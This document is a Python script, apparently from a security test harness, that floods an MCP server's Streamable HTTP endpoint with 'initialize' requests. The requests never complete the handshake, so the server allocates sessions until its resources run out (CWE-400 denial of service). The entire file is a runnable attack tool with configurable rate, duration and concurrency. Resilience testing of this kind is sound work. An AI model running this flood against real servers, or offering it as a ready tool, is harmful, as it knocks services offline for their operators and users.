"""
Vector 2 -- Initialize / session flood (CWE-400), Streamable HTTP transport.

Fires `rate_per_s * duration_s` `initialize` requests (each WITHOUT an
existing mcp-session-id header, so each one is treated by the server as a
new-session attempt) using a bounded worker pool, and never completes the
handshake (no notifications/initialized), which is exactly the cheap,
asymmetric attacker behaviour this vector models: each request is trivial
for the attacker to produce but forces the server's session manager to
allocate a full session (transport object, queues, etc.).

Usage: python attack.py <base_url> <rate_per_s> <duration_s> <concurrency> [timeout_s]
Prints one-line JSON summary: {attempted, ok, failed, elapsed_s, sent_bytes}
"""
from __future__ import annotations

import json
import sys
import time
from concurrent.futures import ThreadPoolExecutor

import httpx

INIT_BODY = {
    "jsonrpc": "2.0", "id": 1, "method": "initialize",
    "params": {"protocolVersion": "2025-06-18", "capabilities": {},
               "clientInfo": {"name": "flood-attacker", "version": "1.0"}},
}
INIT_BYTES = len(json.dumps(INIT_BODY).encode())


def send_one(client: httpx.Client, base_url: str):
    try:
        r = client.post(f"{base_url}/mcp", json=INIT_BODY,
                         headers={"Accept": "application/json, text/event-stream"})
        return r.status_code
    except httpx.HTTPError as e:
        return f"error:{type(e).__name__}"


def main():
    base_url = sys.argv[1]
    rate_per_s = float(sys.argv[2])
    duration_s = float(sys.argv[3])
    concurrency = int(sys.argv[4])
    timeout_s = float(sys.argv[5]) if len(sys.argv) > 5 else 5.0

    total = max(1, int(rate_per_s * duration_s))
    # one shared, connection-pooled client (reused connections -- this is
    # what makes the flood cheap for the attacker: no new TCP handshake
    # per request, matching a realistic keep-alive HTTP attacker)
    limits = httpx.Limits(max_connections=concurrency, max_keepalive_connections=concurrency)
    t0 = time.perf_counter()
    results = []
    with httpx.Client(timeout=timeout_s, limits=limits) as client:
        with ThreadPoolExecutor(max_workers=concurrency) as ex:
            futs = [ex.submit(send_one, client, base_url) for _ in range(total)]
            for f in futs:
                results.append(f.result())
    elapsed = time.perf_counter() - t0

    ok = sum(1 for r in results if r == 200)
    failed = total - ok
    print(json.dumps({"attempted": total, "ok": ok, "failed": failed,
                       "elapsed_s": elapsed, "sent_bytes": INIT_BYTES * total}))


if __name__ == "__main__":
    main()
